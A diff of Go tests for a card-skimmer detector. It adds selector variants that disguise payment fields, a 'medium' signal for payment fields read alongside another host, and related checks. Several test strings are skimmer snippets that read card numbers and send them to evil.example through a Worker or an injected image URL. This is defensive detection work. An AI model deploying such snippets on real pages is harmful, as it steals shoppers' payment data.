@@ -127,7 +127,7 @@ func TestSkimmerOnCleanCorpus(t *testing.T) {
 	if dir == "" {
 		t.Skip("WEB_CORPUS not set")
 	}
-	files := 0
+	files, medium := 0, 0
 	err := filepath.WalkDir(dir, func(p string, d os.DirEntry, err error) error { //nolint:gosec // a test corpus chosen by whoever runs it
 		if err != nil || d.IsDir() || !slices.Contains(skimmerExtensions, strings.ToLower(filepath.Ext(p))) || isScript(strings.ToLower(d.Name())) {
 			return err
@@ -137,15 +137,20 @@ func TestSkimmerOnCleanCorpus(t *testing.T) {
 			return err
 		}
 		files++
-		if sigs := skimmerSignals(data); sigs != nil {
+		var f skimmerFamilies
+		f.scan(data)
+		if sigs := f.verdict(); sigs != nil {
 			t.Errorf("%s: %v", p, sigs)
+		} else if f.fields && f.host {
+			medium++
+			t.Logf("medium %s", p)
 		}
 		return nil
 	})
 	if err != nil {
 		t.Fatal(err)
 	}
-	t.Logf("%d files", files)
+	t.Logf("%d files, %d with a payment field and another host", files, medium)
 }
 
 // Many files changed at once leave out the packages updated as a whole and generated bundles,
@@ -358,6 +363,13 @@ func TestSkimmerSelectorsExitsAndData(t *testing.T) {
 		"CSS escape":            `var f=document.querySelector('[name=\\63 vv]')` + send,
 		"CSS escape no blank":   `var f=document.querySelector('[name*=\\000063vv]')` + send,
 		"base64 head in code":   `var base64;var v=0;base64,0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+cardnumber.value` + send,
+		"prefix only":           `var f=document.querySelector('[name^="card_num"]')` + send,
+		"contains only":         `var f=document.querySelector('[name*="rd_numb"]')` + send,
+		"grouped by is()":       `var f=document.querySelector(':where([name^="card"]):is([name$="number"])')` + send,
+		"namespace and comment": `var f=document.querySelector('[*|name/**/^="card" s][name$="number" s]')` + send,
+		"placeholder":           `var f=document.querySelector('input[placeholder*="Card number"]')` + send,
+		"autocomplete":          `var f=document.querySelector('input[autocomplete="cc-csc"]')` + send,
+		"split id":              `var f=document.querySelector('[id^="card_n"][id$="umber"]')` + send,
 		"split name with a gap": `var f=document.querySelector('[name^="payment[c"][name$="_number]"]')` + send,
 		"escaped id":            `var f=document.querySelector('#card\\4e umber')` + send,
 		"worker":                `var f=document.querySelector('[name="cc_number"]');new Worker('https://evil.example/w.js').postMessage(f.value)`,
@@ -382,6 +394,28 @@ func TestSkimmerSelectorsExitsAndData(t *testing.T) {
 		if s := skimmerSignals([]byte(src)); s != nil {
 			t.Errorf("%s: %v", name, s)
 		}
+	}
+}
+
+// A field a selector names only by a generic part is no payment field; a payment field read with
+// another host named in the script, and no way out the search knows, is the weaker signal.
+func TestPaymentFieldWithHost(t *testing.T) {
+	families := func(src string) skimmerFamilies {
+		var f skimmerFamilies
+		f.scan([]byte(src))
+		return f
+	}
+	for _, sel := range []string{`[name$="number"]`, `[name*="phone_number"]`, `[name="express_checkout"]`, `[name^="exp"]`} {
+		if f := families(`var f=document.querySelector('` + sel + `');new Image().src="https://img.example.com/p?d="+f.value`); f.fields {
+			t.Errorf("%s read as a payment field", sel)
+		}
+	}
+	f := families(`var f=document.querySelector('[name="cc_number"]');$('body').append('<img src="https://evil.example/p?d='+f.value+'">')`)
+	if f.verdict() != nil || !f.fields || !f.host {
+		t.Errorf("jQuery markup: %v fields=%v host=%v", f.verdict(), f.fields, f.host)
+	}
+	if f := families(`var f=document.querySelector('[name="cc_number"]');console.log(f.value)`); f.host {
+		t.Error("a host without a URL")
 	}
 }
 
